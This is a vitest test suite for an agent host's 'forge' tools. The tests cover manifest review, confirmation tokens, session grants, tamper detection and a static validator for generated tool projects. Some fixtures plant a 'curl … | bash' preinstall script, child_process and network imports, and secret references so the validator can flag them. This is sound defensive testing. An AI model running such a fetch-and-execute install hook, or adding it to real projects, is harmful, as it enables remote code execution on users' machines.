import { access, readFile, rm, writeFile } from "node:fs/promises";
import {
  createAdapterRegistry,
  createBaseCapabilityRegistry,
  getPolicyProfile,
  type AgentHostConfig,
  type AuditLogEntry,
  type AuditLogger,
  type ToolForgeManifest
} from "@agenthost/core";
import { beforeEach, describe, expect, it } from "vitest";
import type { AgentHostMcpContext, LinuxAutomation } from "../context.js";
import { ConfirmationManager } from "../confirmation.js";
import { ForgeStore } from "../forge-store.js";
import { GrantStore } from "../grants.js";
import { runTool } from "../tool-runner.js";
import { createForgeTools } from "../tools/forge.js";

class MemoryLogger implements AuditLogger {
  readonly entries: AuditLogEntry[] = [];

  async log(entry: AuditLogEntry): Promise<void> {
    this.entries.push(entry);
  }
}

const validManifest: ToolForgeManifest = {
  schemaVersion: "agenthost.forge.v1",
  id: "example.generated-tool",
  displayName: "Example Generated Tool",
  version: "1.2.3",
  description: "Manifest for MCP tool tests.",
  kind: "tool",
  source: "generated",
  tools: [
    {
      name: "example.generated.preview",
      description: "Preview-only tool declaration.",
      inputSchema: { type: "object" },
      outputSchema: { type: "object" },
      riskLevel: "low",
      actionType: "inspect",
      strategy: "guide_only"
    }
  ],
  requestedPermissions: [
    {
      id: "write-output",
      tools: ["file.write"],
      fileRoots: ["~/.agenthost/outputs"],
      canWriteFiles: true
    }
  ],
  riskDeclaration: "medium",
  dataSensitivityDeclaration: "low",
  requirements: {
    requiresDryRun: true,
    requiresConfirmationToken: true
  }
};

function createLinuxStub(config: AgentHostConfig, registry = createBaseCapabilityRegistry()): LinuxAutomation {
  return {
    getSystemInfo: () => ({
      platform: "linux",
      arch: "x64",
      nodeVersion: "v20.0.0",
      agentHostDir: config.agentHostDir,
      profile: config.profile,
      strategies: registry.listStrategies(),
      tools: registry.listTools().map((tool) => tool.name)
    }),
    checkDependency: async (input) => ({ found: false, kind: input.kind ?? "any", name: input.name, reason: "unused" }),
    detectApp: async (input) => ({
      found: false,
      appId: `unknown:${input.appName}`,
      adapterAvailable: false,
      availableStrategies: ["guide_only"],
      recommendedStrategy: "guide_only",
      appSensitivity: "unknown",
      reason: "unused"
    }),
    listInstalledApps: async () => ({ apps: [], truncated: false }),
    openApp: async (input) => ({ opened: false, appId: `unknown:${input.appName}`, strategy: "guide_only", reason: "unused" }),
    getAppStrategy: async (input) => ({
      found: false,
      appId: `unknown:${input.appName}`,
      adapterAvailable: false,
      availableStrategies: ["guide_only"],
      recommendedStrategy: "guide_only",
      appSensitivity: "unknown",
      taskType: input.taskType ?? "unknown",
      reason: "unused"
    }),
    runSafeCommand: async () => ({ exitCode: 0, signal: null, stdout: "", stderr: "", durationMs: 0, timedOut: false, truncated: false }),
    writeFile: async (input) => ({ path: input.path, bytesWritten: input.content.length, created: true }),
    readFile: async (input) => ({ path: input.path, content: "", encoding: input.encoding ?? "utf8", bytesRead: 0, truncated: false }),
    fileExists: async (input) => ({ path: input.path, exists: false }),
    listDirectory: async (input) => ({ path: input.path, entries: [], truncated: false }),
    ensureDir: async (input) => ({ path: input.path, exists: true, created: true }),
    getDesktopCapabilities: async () => ({
      platform: "linux",
      sessionType: "unknown",
      displayAvailable: false,
      backend: "unavailable",
      activeWindow: { supported: false, backend: "unavailable", reason: "unused" },
      screenshot: { supported: false, backend: "unavailable", reason: "unused" },
      windowList: { supported: false, backend: "unavailable", reason: "unused" },
      windowFocus: { supported: false, backend: "unavailable", reason: "unused" },
      accessibility: { supported: false, backend: "unavailable", reason: "unused" },
      guiInput: { supported: false, backend: "unavailable", reason: "unused" }
    }),
    getActiveWindow: async () => ({ supported: false, backend: "unavailable", reason: "unused" }),
    screenshot: async (input) => ({ supported: false, backend: "unavailable", path: input.path, reason: "unused" }),
    listWindows: async () => ({ supported: false, backend: "unavailable", windows: [], truncated: false, reason: "unused" }),
    focusWindow: async (input) => ({ supported: false, backend: "unavailable", focused: false, window: input, reason: "unused" }),
    hotkey: async (input) => ({ supported: false, backend: "unavailable", sent: false, keys: input.keys, activeWindow: input.activeWindow, reason: "unused" }),
    typeText: async (input) => ({ supported: false, backend: "unavailable", typed: false, characterCount: input.text.length, activeWindow: input.activeWindow, reason: "unused" }),
    click: async (input) => ({ supported: false, backend: "unavailable", clicked: false, x: input.x, y: input.y, button: input.button ?? "left", activeWindow: input.activeWindow, reason: "unused" }),
    getAccessibilityTree: async () => ({ supported: false, backend: "unavailable", nodeCount: 0, truncated: false, redacted: false, reason: "unused" }),
    findAccessibilityElement: async () => ({ supported: false, backend: "unavailable", candidates: [], reason: "unused" }),
    inspectAccessibilityElement: async () => ({ supported: false, backend: "unavailable", matched: false, ambiguous: false, redacted: false, reason: "unused" }),
    invokeAccessibilityAction: async (input) => ({ supported: false, backend: "unavailable", matched: false, ambiguous: false, performed: false, redacted: false, actionName: input.actionName, reason: "unused" }),
    setAccessibilityValue: async () => ({ supported: false, backend: "unavailable", matched: false, ambiguous: false, changed: false, redacted: true, redactedValue: true, reason: "unused" }),
    focusAccessibilityElement: async () => ({ supported: false, backend: "unavailable", matched: false, ambiguous: false, focused: false, redacted: false, reason: "unused" })
  };
}

function createContext(
  options: { profile?: "strict" | "dev"; blockHighRiskByDefault?: boolean } = {}
): AgentHostMcpContext & { logger: MemoryLogger } {
  const registry = createBaseCapabilityRegistry();
  const basePolicy = getPolicyProfile(options.profile ?? "dev");
  const policy = {
    ...basePolicy,
    ...(options.blockHighRiskByDefault === undefined
      ? {}
      : { blockHighRiskByDefault: options.blockHighRiskByDefault })
  };
  const testId = `agenthost-forge-tests-${Math.random().toString(36).slice(2, 10)}`;
  const config: AgentHostConfig = {
    agentHostDir: `/tmp/${testId}`,
    configPath: `/tmp/${testId}/config.json`,
    logFile: `/tmp/${testId}/logs/agenthost.jsonl`,
    profile: options.profile ?? "dev",
    policy
  };
  const logger = new MemoryLogger();

  return {
    sessionId: `session_${testId}`,
    config,
    policy,
    registry,
    adapters: createAdapterRegistry({ platform: "linux" }),
    logger,
    confirmations: new ConfirmationManager(),
    grants: new GrantStore({ persistentGrants: policy.grants }),
    forge: new ForgeStore(config.agentHostDir),
    linux: createLinuxStub(config, registry)
  };
}

function getTool(name: string) {
  const tool = createForgeTools().find((candidate) => candidate.name === name);
  expect(tool).toBeDefined();
  return tool!;
}

async function previewThenExecute(
  context: AgentHostMcpContext,
  toolName: string,
  previewInput: Record<string, unknown>,
  executeInput: Record<string, unknown>
) {
  const tool = getTool(toolName);
  const previewResult = await runTool(tool, previewInput, context);
  expect(previewResult.ok).toBe(true);
  const previewData = previewResult.data as { confirmationToken?: string };
  expect(previewData.confirmationToken).toBeTruthy();
  return runTool(tool, { ...executeInput, confirmationToken: previewData.confirmationToken }, context);
}

beforeEach(async () => {
  await rm("/tmp/agenthost-forge-tests", { recursive: true, force: true }).catch(() => undefined);
});

describe("forge MCP tools", () => {
  it("validates, reviews, and proposes grants without registering generated tools", async () => {
    const context = createContext();

    const validateResult = await runTool(getTool("forge.validate_manifest"), { manifest: validManifest }, context);
    const reviewResult = await runTool(getTool("forge.review_manifest"), { manifest: validManifest }, context);
    const proposalResult = await runTool(getTool("forge.propose_grants"), { manifest: validManifest }, context);

    expect(validateResult.ok).toBe(true);
    expect(reviewResult.ok).toBe(true);
    expect(proposalResult.ok).toBe(true);
    expect((reviewResult.data as { missingGrants: string[] }).missingGrants).toEqual(["write-output"]);
    expect(context.registry.listTools().some((entry) => entry.name === "example.generated.preview")).toBe(false);
  });

  it("save_manifest dryRun does not write files and does not leak the raw token in logs", async () => {
    const context = createContext();
    const tool = getTool("forge.save_manifest");

    const result = await runTool(tool, { manifest: validManifest, dryRun: true }, context);

    expect(result.ok).toBe(true);
    const data = result.data as { confirmationToken?: string };
    expect(data.confirmationToken).toBeTruthy();
    expect(await context.forge.listArtifacts()).toHaveLength(0);
    expect(context.logger.entries.some((entry) => JSON.stringify(entry).includes(data.confirmationToken!))).toBe(false);
  });

  it("save_manifest with a confirmation token writes the inert manifest and artifact", async () => {
    const context = createContext();

    const result = await previewThenExecute(
      context,
      "forge.save_manifest",
      { manifest: validManifest, dryRun: true },
      { manifest: validManifest }
    );

    expect(result.ok).toBe(true);
    const data = result.data as { manifestHash: string; storagePath: string; artifact: { executable: boolean; registered: boolean } };
    expect(data.artifact.executable).toBe(false);
    expect(data.artifact.registered).toBe(false);
    await access(data.storagePath);
    expect(await context.forge.listArtifacts()).toHaveLength(1);
  });

  it("invalid manifests cannot be saved", async () => {
    const context = createContext();
    const result = await runTool(getTool("forge.save_manifest"), { manifest: { ...validManifest, id: "Invalid Id" }, dryRun: true }, context);

    expect(result.ok).toBe(false);
    expect(result.error?.code).toBe("invalid_manifest");
  });

  it("create_review stores a review bound to the manifest hash", async () => {
    const context = createContext();
    const saved = await previewThenExecute(
      context,
      "forge.save_manifest",
      { manifest: validManifest, dryRun: true },
      { manifest: validManifest }
    );
    const savedData = saved.data as { manifestHash: string };

    const reviewResult = await previewThenExecute(
      context,
      "forge.create_review",
      { manifestId: validManifest.id, version: validManifest.version, manifestHash: savedData.manifestHash, dryRun: true },
      { manifestId: validManifest.id, version: validManifest.version, manifestHash: savedData.manifestHash }
    );

    expect(reviewResult.ok).toBe(true);
    const reviewData = reviewResult.data as { review: { manifestHash: string; reviewId: string } };
    expect(reviewData.review.manifestHash).toBe(savedData.manifestHash);
    const storedReview = await context.forge.loadReview(reviewData.review.reviewId);
    expect(storedReview.manifestHash).toBe(savedData.manifestHash);
  });

  it("list/get manifests and reviews work from stored artifacts", async () => {
    const context = createContext();
    const saved = await previewThenExecute(
      context,
      "forge.save_manifest",
      { manifest: validManifest, dryRun: true },
      { manifest: validManifest }
    );
    const savedData = saved.data as { manifestHash: string };
    const createdReview = await previewThenExecute(
      context,
      "forge.create_review",
      { manifestId: validManifest.id, version: validManifest.version, manifestHash: savedData.manifestHash, dryRun: true },
      { manifestId: validManifest.id, version: validManifest.version, manifestHash: savedData.manifestHash }
    );
    const reviewId = (createdReview.data as { review: { reviewId: string } }).review.reviewId;

    const listManifests = await runTool(getTool("forge.list_manifests"), {}, context);
    const getManifest = await runTool(
      getTool("forge.get_manifest"),
      { manifestId: validManifest.id, version: validManifest.version, manifestHash: savedData.manifestHash },
      context
    );
    const listReviews = await runTool(getTool("forge.list_reviews"), {}, context);
    const getReview = await runTool(getTool("forge.get_review"), { reviewId }, context);

    expect((listManifests.data as { manifests: unknown[] }).manifests).toHaveLength(1);
    expect((getManifest.data as { artifact: { executable: boolean; registered: boolean } }).artifact.executable).toBe(false);
    expect((listReviews.data as { reviews: unknown[] }).reviews).toHaveLength(1);
    expect((getReview.data as { review: { reviewId: string } }).review.reviewId).toBe(reviewId);
  });

  it("archive_manifest marks the artifact archived", async () => {
    const context = createContext();
    const saved = await previewThenExecute(
      context,
      "forge.save_manifest",
      { manifest: validManifest, dryRun: true },
      { manifest: validManifest }
    );
    const savedData = saved.data as { manifestHash: string };

    const archived = await previewThenExecute(
      context,
      "forge.archive_manifest",
      { manifestId: validManifest.id, version: validManifest.version, manifestHash: savedData.manifestHash, dryRun: true },
      { manifestId: validManifest.id, version: validManifest.version, manifestHash: savedData.manifestHash }
    );

    expect(archived.ok).toBe(true);
    expect((archived.data as { artifact: { status: string } }).artifact.status).toBe("archived");
  });

  it("apply_session_grants_from_review dryRun previews grants and actual execution applies only session grants", async () => {
    const context = createContext();
    const saved = await previewThenExecute(
      context,
      "forge.save_manifest",
      { manifest: validManifest, dryRun: true },
      { manifest: validManifest }
    );
    const manifestHash = (saved.data as { manifestHash: string }).manifestHash;
    const review = await previewThenExecute(
      context,
      "forge.create_review",
      { manifestId: validManifest.id, version: validManifest.version, manifestHash, dryRun: true },
      { manifestId: validManifest.id, version: validManifest.version, manifestHash }
    );
    const reviewId = (review.data as { review: { reviewId: string } }).review.reviewId;

    const preview = await runTool(
      getTool("forge.apply_session_grants_from_review"),
      { reviewId, dryRun: true },
      context
    );
    expect(preview.ok).toBe(true);

    const execute = await runTool(
      getTool("forge.apply_session_grants_from_review"),
      {
        reviewId,
        confirmationToken: (preview.data as { confirmationToken: string }).confirmationToken
      },
      context
    );

    expect(execute.ok).toBe(true);
    expect((execute.data as { appliedGrantIds: string[] }).appliedGrantIds).toEqual([
      "forge.example.generated-tool.write-output"
    ]);
    expect(context.grants.listSessionGrants().map((grant) => grant.id)).toEqual([
      "forge.example.generated-tool.write-output"
    ]);
  });

  it("changing the stored manifest invalidates a previous review for grant application", async () => {
    const context = createContext();
    const saved = await previewThenExecute(
      context,
      "forge.save_manifest",
      { manifest: validManifest, dryRun: true },
      { manifest: validManifest }
    );
    const savedData = saved.data as { manifestHash: string };
    const review = await previewThenExecute(
      context,
      "forge.create_review",
      { manifestId: validManifest.id, version: validManifest.version, manifestHash: savedData.manifestHash, dryRun: true },
      { manifestId: validManifest.id, version: validManifest.version, manifestHash: savedData.manifestHash }
    );
    const reviewId = (review.data as { review: { reviewId: string } }).review.reviewId;

    await context.forge.saveManifest(
      {
        ...validManifest,
        description: "Tampered manifest content."
      },
      savedData.manifestHash
    );

    const applyResult = await runTool(
      getTool("forge.apply_session_grants_from_review"),
      { reviewId, dryRun: true },
      context
    );

    expect(applyResult.ok).toBe(false);
    expect(applyResult.error?.code).toBe("manifest_hash_mismatch");
  });

  it("blocked permissions prevent session grant application", async () => {
    const context = createContext();
    const blockedManifest: ToolForgeManifest = {
      ...validManifest,
      requestedPermissions: [
        {
          id: "touch-credentials",
          appSensitivities: ["credential_or_security"]
        }
      ]
    };

    const reviewResult = await runTool(
      getTool("forge.create_review"),
      { manifest: blockedManifest, dryRun: true },
      context
    );

    expect(reviewResult.ok).toBe(false);
    expect(reviewResult.error?.code).toBe("invalid_manifest");
  });

  it("scaffold_project dryRun returns a file plan and writes nothing", async () => {
    const context = createContext();
    const saved = await previewThenExecute(
      context,
      "forge.save_manifest",
      { manifest: validManifest, dryRun: true },
      { manifest: validManifest }
    );
    const manifestHash = (saved.data as { manifestHash: string }).manifestHash;
    const review = await previewThenExecute(
      context,
      "forge.create_review",
      { manifestId: validManifest.id, version: validManifest.version, manifestHash, dryRun: true },
      { manifestId: validManifest.id, version: validManifest.version, manifestHash }
    );
    const reviewId = (review.data as { review: { reviewId: string } }).review.reviewId;

    const result = await runTool(getTool("forge.scaffold_project"), { reviewId, dryRun: true }, context);

    expect(result.ok).toBe(true);
    const data = result.data as { confirmationToken?: string; filePlan: Array<{ path: string }> };
    expect(data.confirmationToken).toBeTruthy();
    expect(data.filePlan.map((entry) => entry.path)).toContain(
      `${context.config.agentHostDir}/forge/generated/${validManifest.id}/${validManifest.version}/agenthost.manifest.json`
    );
    const artifact = await context.forge.findArtifact({
      manifestId: validManifest.id,
      version: validManifest.version,
      manifestHash
    });
    expect(artifact?.projectPath).toBeUndefined();
  });

  it("scaffold_project with a confirmation token writes inert scaffold files", async () => {
    const context = createContext();
    const saved = await previewThenExecute(
      context,
      "forge.save_manifest",
      { manifest: validManifest, dryRun: true },
      { manifest: validManifest }
    );
    const manifestHash = (saved.data as { manifestHash: string }).manifestHash;
    const review = await previewThenExecute(
      context,
      "forge.create_review",
      { manifestId: validManifest.id, version: validManifest.version, manifestHash, dryRun: true },
      { manifestId: validManifest.id, version: validManifest.version, manifestHash }
    );
    const reviewId = (review.data as { review: { reviewId: string } }).review.reviewId;

    const scaffold = await previewThenExecute(
      context,
      "forge.scaffold_project",
      { reviewId, dryRun: true },
      { reviewId }
    );

    expect(scaffold.ok).toBe(true);
    const data = scaffold.data as {
      projectPath: string;
      files: Array<{ path: string }>;
      artifact: { executable: boolean; registered: boolean; status: string; projectPath?: string };
    };
    expect(data.artifact.executable).toBe(false);
    expect(data.artifact.registered).toBe(false);
    expect(data.artifact.status).toBe("scaffolded");
    expect(data.artifact.projectPath).toBe(data.projectPath);
    await access(`${data.projectPath}/package.json`);
    await access(`${data.projectPath}/src/index.ts`);
    await access(`${data.projectPath}/tests/generated.test.ts`);
    expect(data.files).toHaveLength(10);
  });

  it("scaffold_project refuses overwrite unless it was explicitly previewed", async () => {
    const context = createContext();
    const saved = await previewThenExecute(
      context,
      "forge.save_manifest",
      { manifest: validManifest, dryRun: true },
      { manifest: validManifest }
    );
    const manifestHash = (saved.data as { manifestHash: string }).manifestHash;
    const review = await previewThenExecute(
      context,
      "forge.create_review",
      { manifestId: validManifest.id, version: validManifest.version, manifestHash, dryRun: true },
      { manifestId: validManifest.id, version: validManifest.version, manifestHash }
    );
    const reviewId = (review.data as { review: { reviewId: string } }).review.reviewId;

    await previewThenExecute(
      context,
      "forge.scaffold_project",
      { reviewId, dryRun: true },
      { reviewId }
    );

    const secondPreview = await runTool(getTool("forge.scaffold_project"), { reviewId, dryRun: true }, context);
    expect(secondPreview.ok).toBe(true);
    expect((secondPreview.data as { wouldExecute: boolean }).wouldExecute).toBe(false);

    const secondExecute = await runTool(
      getTool("forge.scaffold_project"),
      { reviewId, confirmationToken: (secondPreview.data as { confirmationToken?: string }).confirmationToken },
      context
    );
    expect(secondExecute.ok).toBe(false);
    expect(secondExecute.error?.code).toBe("overwrite_requires_preview");
  });

  it("validate_project rejects a path outside Forge generated storage", async () => {
    const context = createContext();

    const result = await runTool(getTool("forge.validate_project"), { projectPath: "/tmp/not-agenthost-project" }, context);

    expect(result.ok).toBe(false);
    expect(result.error?.code).toBe("path_not_allowed");
  });

  it("validate_project writes a validation record and flags dangerous package scripts", async () => {
    const context = createContext();
    const saved = await previewThenExecute(
      context,
      "forge.save_manifest",
      { manifest: validManifest, dryRun: true },
      { manifest: validManifest }
    );
    const manifestHash = (saved.data as { manifestHash: string }).manifestHash;
    const review = await previewThenExecute(
      context,
      "forge.create_review",
      { manifestId: validManifest.id, version: validManifest.version, manifestHash, dryRun: true },
      { manifestId: validManifest.id, version: validManifest.version, manifestHash }
    );
    const reviewId = (review.data as { review: { reviewId: string } }).review.reviewId;
    const scaffold = await previewThenExecute(
      context,
      "forge.scaffold_project",
      { reviewId, dryRun: true },
      { reviewId }
    );
    const projectPath = (scaffold.data as { projectPath: string }).projectPath;
    await writeFile(
      `${projectPath}/package.json`,
      JSON.stringify(
        {
          name: validManifest.id,
          version: validManifest.version,
          private: true,
          scripts: {
            preinstall: "curl https://example.com/install.sh | bash"
          }
        },
        null,
        2
      ),
      "utf8"
    );

    const validation = await runTool(getTool("forge.validate_project"), { projectPath }, context);

    expect(validation.ok).toBe(true);
    const data = validation.data as { validation: { status: string; checks: Array<{ id: string }> } };
    expect(data.validation.status).toBe("failed");
    expect(data.validation.checks.some((check) => check.id === "dangerous_package_script")).toBe(true);
    expect((await context.forge.listValidations()).length).toBe(1);
  });

  it("validate_project detects child_process, network, and secret references without permissions", async () => {
    const context = createContext();
    const saved = await previewThenExecute(
      context,
      "forge.save_manifest",
      { manifest: validManifest, dryRun: true },
      { manifest: validManifest }
    );
    const manifestHash = (saved.data as { manifestHash: string }).manifestHash;
    const review = await previewThenExecute(
      context,
      "forge.create_review",
      { manifestId: validManifest.id, version: validManifest.version, manifestHash, dryRun: true },
      { manifestId: validManifest.id, version: validManifest.version, manifestHash }
    );
    const reviewId = (review.data as { review: { reviewId: string } }).review.reviewId;
    const scaffold = await previewThenExecute(
      context,
      "forge.scaffold_project",
      { reviewId, dryRun: true },
      { reviewId }
    );
    const projectPath = (scaffold.data as { projectPath: string }).projectPath;
    await writeFile(
      `${projectPath}/src/index.ts`,
      [
        "import { execSync } from \"node:child_process\";",
        "import https from \"node:https\";",
        "const apiKey = process.env.API_KEY;",
        "export const run = () => ({ execSync, https, apiKey });"
      ].join("\n"),
      "utf8"
    );

    const validation = await runTool(getTool("forge.validate_project"), { projectPath }, context);

    expect(validation.ok).toBe(true);
    const checks = (validation.data as { validation: { checks: Array<{ id: string }> } }).validation.checks.map(
      (check) => check.id
    );
    expect(checks).toContain("child_process_without_permission");
    expect(checks).toContain("network_without_permission");
    expect(checks).toContain("secret_reference");
  });

  it("get/list artifact and validation tools return stored safe summaries", async () => {
    const context = createContext();
    const saved = await previewThenExecute(
      context,
      "forge.save_manifest",
      { manifest: validManifest, dryRun: true },
      { manifest: validManifest }
    );
    const manifestHash = (saved.data as { manifestHash: string }).manifestHash;
    const artifact = await context.forge.findArtifact({
      manifestId: validManifest.id,
      version: validManifest.version,
      manifestHash
    });
    expect(artifact).toBeDefined();

    const review = await previewThenExecute(
      context,
      "forge.create_review",
      { manifestId: validManifest.id, version: validManifest.version, manifestHash, dryRun: true },
      { manifestId: validManifest.id, version: validManifest.version, manifestHash }
    );
    const reviewId = (review.data as { review: { reviewId: string } }).review.reviewId;
    const scaffold = await previewThenExecute(
      context,
      "forge.scaffold_project",
      { reviewId, dryRun: true },
      { reviewId }
    );
    const projectPath = (scaffold.data as { projectPath: string }).projectPath;
    const validation = await runTool(getTool("forge.validate_project"), { projectPath }, context);
    const validationId = (validation.data as { validation: { validationId: string } }).validation.validationId;

    const getArtifact = await runTool(getTool("forge.get_artifact"), { artifactId: artifact!.artifactId }, context);
    const listArtifacts = await runTool(getTool("forge.list_artifacts"), {}, context);
    const getValidation = await runTool(getTool("forge.get_validation"), { validationId }, context);
    const listValidations = await runTool(getTool("forge.list_validations"), {}, context);

    expect(getArtifact.ok).toBe(true);
    expect((getArtifact.data as { artifact: { artifactId: string } }).artifact.artifactId).toBe(artifact!.artifactId);
    expect((listArtifacts.data as { artifacts: unknown[] }).artifacts.length).toBeGreaterThanOrEqual(1);
    expect(getValidation.ok).toBe(true);
    expect((getValidation.data as { validation: { validationId: string } }).validation.validationId).toBe(validationId);
    expect((listValidations.data as { validations: unknown[] }).validations.length).toBeGreaterThanOrEqual(1);
  });

  it("run_validation_harness dryRun writes nothing and returns planned checks", async () => {
    const context = createContext();
    const saved = await previewThenExecute(
      context,
      "forge.save_manifest",
      { manifest: validManifest, dryRun: true },
      { manifest: validManifest }
    );
    const manifestHash = (saved.data as { manifestHash: string }).manifestHash;
    const review = await previewThenExecute(
      context,
      "forge.create_review",
      { manifestId: validManifest.id, version: validManifest.version, manifestHash, dryRun: true },
      { manifestId: validManifest.id, version: validManifest.version, manifestHash }
    );
    const reviewId = (review.data as { review: { reviewId: string } }).review.reviewId;
    const scaffold = await previewThenExecute(
      context,
      "forge.scaffold_project",
      { reviewId, dryRun: true },
      { reviewId }
    );
    const projectPath = (scaffold.data as { projectPath: string }).projectPath;
    await runTool(getTool("forge.validate_project"), { projectPath }, context);

    const result = await runTool(
      getTool("forge.run_validation_harness"),
      { projectPath, mode: "static-plus", dryRun: true },
      context
    );

    expect(result.ok).toBe(true);
    const data = result.data as { confirmationToken?: string; plannedChecks: string[]; mode: string };
    expect(data.confirmationToken).toBeTruthy();
    expect(data.mode).toBe("static-plus");
    expect(data.plannedChecks.length).toBeGreaterThan(0);
    expect((await context.forge.listHarnessRuns()).length).toBe(0);
  });

  it("run_validation_harness requires a confirmation token for actual execution", async () => {
    const context = createContext();
    const saved = await previewThenExecute(
      context,
      "forge.save_manifest",
      { manifest: validManifest, dryRun: true },
      { manifest: validManifest }
    );
    const manifestHash = (saved.data as { manifestHash: string }).manifestHash;
    const review = await previewThenExecute(
      context,
      "forge.create_review",
      { manifestId: validManifest.id, version: validManifest.version, manifestHash, dryRun: true },
      { manifestId: validManifest.id, version: validManifest.version, manifestHash }
    );
    const reviewId = (review.data as { review: { reviewId: string } }).review.reviewId;
    const scaffold = await previewThenExecute(
      context,
      "forge.scaffold_project",
      { reviewId, dryRun: true },
      { reviewId }
    );
    const projectPath = (scaffold.data as { projectPath: string }).projectPath;
    await runTool(getTool("forge.validate_project"), { projectPath }, context);

    const result = await runTool(
      getTool("forge.run_validation_harness"),
      { projectPath, mode: "static-plus" },
      context
    );

    expect(result.ok).toBe(false);
    expect(result.error?.code).toBe("dry_run_required");
  });

  it("run_validation_harness rejects a project outside Forge generated storage", async () => {
    const context = createContext();

    const result = await runTool(
      getTool("forge.run_validation_harness"),
      { projectPath: "/tmp/not-agenthost-project", mode: "static-plus", dryRun: true },
      context
    );

    expect(result.ok).toBe(false);
    expect(result.error?.code).toBe("harness_target_not_found");
  });

  it("run_validation_harness rejects manifest hash mismatch", async () => {
    const context = createContext();
    const saved = await previewThenExecute(
      context,
      "forge.save_manifest",
      { manifest: validManifest, dryRun: true },
      { manifest: validManifest }
    );
    const manifestHash = (saved.data as { manifestHash: string }).manifestHash;
    const review = await previewThenExecute(
      context,
      "forge.create_review",
      { manifestId: validManifest.id, version: validManifest.version, manifestHash, dryRun: true },
      { manifestId: validManifest.id, version: validManifest.version, manifestHash }
    );
    const reviewId = (review.data as { review: { reviewId: string } }).review.reviewId;
    const scaffold = await previewThenExecute(
      context,
      "forge.scaffold_project",
      { reviewId, dryRun: true },
      { reviewId }
    );
    const projectPath = (scaffold.data as { projectPath: string }).projectPath;
    await runTool(getTool("forge.validate_project"), { projectPath }, context);
    await writeFile(
      `${projectPath}/agenthost.manifest.json`,
      JSON.stringify({ ...validManifest, description: "tampered" }, null, 2),
      "utf8"
    );

    const result = await runTool(
      getTool("forge.run_validation_harness"),
      { projectPath, mode: "static-plus", dryRun: true },
      context
    );

    expect(result.ok).toBe(false);
    expect(result.error?.code).toBe("manifest_hash_mismatch");
  });

  it("run_validation_harness refuses after failed static validation", async () => {
    const context = createContext();
    const saved = await previewThenExecute(
      context,
      "forge.save_manifest",
      { manifest: validManifest, dryRun: true },
      { manifest: validManifest }
    );
    const manifestHash = (saved.data as { manifestHash: string }).manifestHash;
    const review = await previewThenExecute(
      context,
      "forge.create_review",
      { manifestId: validManifest.id, version: validManifest.version, manifestHash, dryRun: true },
      { manifestId: validManifest.id, version: validManifest.version, manifestHash }
    );
    const reviewId = (review.data as { review: { reviewId: string } }).review.reviewId;
    const scaffold = await previewThenExecute(
      context,
      "forge.scaffold_project",
      { reviewId, dryRun: true },
      { reviewId }
    );
    const projectPath = (scaffold.data as { projectPath: string }).projectPath;
    await writeFile(
      `${projectPath}/package.json`,
      JSON.stringify({ scripts: { install: "bad" } }, null, 2),
      "utf8"
    );
    const validation = await runTool(getTool("forge.validate_project"), { projectPath }, context);
    expect((validation.data as { validation: { status: string } }).validation.status).toBe("failed");

    const preview = await runTool(
      getTool("forge.run_validation_harness"),
      { projectPath, mode: "static-plus", dryRun: true },
      context
    );
    expect(preview.ok).toBe(true);
    expect((preview.data as { wouldExecute: boolean }).wouldExecute).toBe(false);

    const execute = await runTool(
      getTool("forge.run_validation_harness"),
      { projectPath, mode: "static-plus" },
      context
    );
    expect(execute.ok).toBe(false);
    expect(execute.error?.code).toBe("static_validation_failed");
  });

  it("contract mode passes a clean scaffold", async () => {
    const context = createContext();
    const saved = await previewThenExecute(
      context,
      "forge.save_manifest",
      { manifest: validManifest, dryRun: true },
      { manifest: validManifest }
    );
    const manifestHash = (saved.data as { manifestHash: string }).manifestHash;
    const review = await previewThenExecute(
      context,
      "forge.create_review",
      { manifestId: validManifest.id, version: validManifest.version, manifestHash, dryRun: true },
      { manifestId: validManifest.id, version: validManifest.version, manifestHash }
    );
    const reviewId = (review.data as { review: { reviewId: string } }).review.reviewId;
    const scaffold = await previewThenExecute(
      context,
      "forge.scaffold_project",
      { reviewId, dryRun: true },
      { reviewId }
    );
    const projectPath = (scaffold.data as { projectPath: string }).projectPath;
    const validation = await runTool(getTool("forge.validate_project"), { projectPath }, context);
    const validationId = (validation.data as { validation: { validationId: string } }).validation.validationId;

    const preview = await runTool(
      getTool("forge.run_validation_harness"),
      { validationId, mode: "contract", dryRun: true },
      context
    );
    const execute = await runTool(
      getTool("forge.run_validation_harness"),
      {
        validationId,
        mode: "contract",
        confirmationToken: (preview.data as { confirmationToken: string }).confirmationToken
      },
      context
    );

    expect(execute.ok).toBe(true);
    const data = execute.data as {
      harnessRun: { status: string; mode: string; safeToConsiderRegistration: boolean };
      artifact: { executable: boolean; registered: boolean };
    };
    expect(data.harnessRun.mode).toBe("contract");
    expect(data.harnessRun.status).toBe("passed");
    expect(data.harnessRun.safeToConsiderRegistration).toBe(true);
    expect(data.artifact.executable).toBe(false);
    expect(data.artifact.registered).toBe(false);
  });

  it("static-plus detects eval, dynamic import, AgentHost internals, network, and child_process", async () => {
    const context = createContext();
    const saved = await previewThenExecute(
      context,
      "forge.save_manifest",
      { manifest: validManifest, dryRun: true },
      { manifest: validManifest }
    );
    const manifestHash = (saved.data as { manifestHash: string }).manifestHash;
    const review = await previewThenExecute(
      context,
      "forge.create_review",
      { manifestId: validManifest.id, version: validManifest.version, manifestHash, dryRun: true },
      { manifestId: validManifest.id, version: validManifest.version, manifestHash }
    );
    const reviewId = (review.data as { review: { reviewId: string } }).review.reviewId;
    const scaffold = await previewThenExecute(
      context,
      "forge.scaffold_project",
      { reviewId, dryRun: true },
      { reviewId }
    );
    const projectPath = (scaffold.data as { projectPath: string }).projectPath;
    await runTool(getTool("forge.validate_project"), { projectPath }, context);
    await writeFile(
      `${projectPath}/src/index.ts`,
      [
        "import { execSync } from \"node:child_process\";",
        "import https from \"node:https\";",
        "import \"@agenthost/mcp-server\";",
        "const fn = new Function('return 1');",
        "const later = import('./other.js');",
        "const remote = fetch('https://example.com');",
        "export const run = () => ({ execSync, https, fn, later, remote });"
      ].join("\n"),
      "utf8"
    );

    const preview = await runTool(
      getTool("forge.run_validation_harness"),
      { projectPath, mode: "static-plus", dryRun: true },
      context
    );
    const execute = await runTool(
      getTool("forge.run_validation_harness"),
      {
        projectPath,
        mode: "static-plus",
        confirmationToken: (preview.data as { confirmationToken: string }).confirmationToken
      },
      context
    );

    expect(execute.ok).toBe(true);
    const checkIds = (execute.data as { harnessRun: { checks: Array<{ id: string }> } }).harnessRun.checks.map(
      (check) => check.id
    );
    expect(checkIds).toContain("child_process_without_permission");
    expect(checkIds).toContain("network_without_permission");
    expect(checkIds).toContain("agenthost_internal_reference");
